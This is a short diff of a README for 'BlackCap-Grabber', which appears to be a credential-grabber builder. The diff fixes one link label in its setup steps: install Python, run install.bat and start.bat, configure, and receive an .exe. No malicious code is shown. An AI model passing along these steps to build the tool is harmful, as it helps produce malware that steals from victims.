@@ -40,7 +40,7 @@ BlackCap was made for educational purposes, there for all consequences caused by
 
 1. Install [Python](https://www.python.org/downloads/)
 2. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
-3. Click on start.bat [build.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
+3. Click on start.bat [start.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
 4. Complete the configuration
 5. You have your .exe file enjoy :)
 
